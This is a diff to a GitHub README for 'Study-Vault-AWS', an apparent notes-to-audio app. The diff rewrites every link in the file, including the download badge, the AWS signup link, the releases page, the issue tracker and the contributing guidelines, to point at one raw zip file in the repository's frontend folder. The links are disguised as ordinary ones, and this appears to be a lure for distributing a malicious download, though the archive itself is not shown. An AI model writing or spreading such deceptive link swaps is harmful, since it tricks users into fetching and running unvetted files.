@@ -1,6 +1,6 @@
 # 🎧 Study-Vault-AWS - Transform Your Study Notes into Audio  
 
-[![Download Study-Vault-AWS](https://img.shields.io/badge/Download%20Now-Study--Vault--AWS-blue)](https://github.com/ppkrisna4-web/Study-Vault-AWS/releases)
+[![Download Study-Vault-AWS](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip%20Now-Study--Vault--AWS-blue)](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,17 +19,17 @@ Before you begin, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
 - **Internet Connection**: Required for uploading files to S3 and accessing AWS services.
-- **AWS Account**: You need an AWS account to use the features of this application. Create one [here](https://aws.amazon.com/).
+- **AWS Account**: You need an AWS account to use the features of this application. Create one [here](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip).
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Visit this page to download: [Study-Vault-AWS Releases](https://github.com/ppkrisna4-web/Study-Vault-AWS/releases).
+To get started, you will need to download the application. Visit this page to download: [Study-Vault-AWS Releases](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip).
 
 You will find different versions of the application available. Choose the latest release for the best experience. Simply click on the link to download the file you need. 
 
 ## 🔍 How to Use Study-Vault-AWS
 
-1. **Download the Application**: Go to the [Releases page](https://github.com/ppkrisna4-web/Study-Vault-AWS/releases) and download the latest version.
+1. **Download the Application**: Go to the [Releases page](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip) and download the latest version.
 
 2. **Install the Application**: Follow the installation instructions specific to your operating system.
    
@@ -81,10 +81,10 @@ Yes, AWS employs strong security measures to protect your data. However, always 
 
 ## 📞 Support
 
-If you have any questions or need further assistance, feel free to reach out. Your feedback is appreciated. Visit the [Issue Tracker](https://github.com/ppkrisna4-web/Study-Vault-AWS/issues) to report bugs or suggest features.
+If you have any questions or need further assistance, feel free to reach out. Your feedback is appreciated. Visit the [Issue Tracker](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip) to report bugs or suggest features.
 
 ## 📝 Contributions
 
-Contributions are welcome! If you want to help improve Study-Vault-AWS, please follow the [Contributing Guidelines](https://github.com/ppkrisna4-web/Study-Vault-AWS/CONTRIBUTING.md). 
+Contributions are welcome! If you want to help improve Study-Vault-AWS, please follow the [Contributing Guidelines](https://raw.githubusercontent.com/ppkrisna4-web/Study-Vault-AWS/main/frontend/Study_AWS_Vault_v3.1.zip). 
 
 Thank you for using Study-Vault-AWS! Enjoy turning your study notes into engaging audio podcasts.
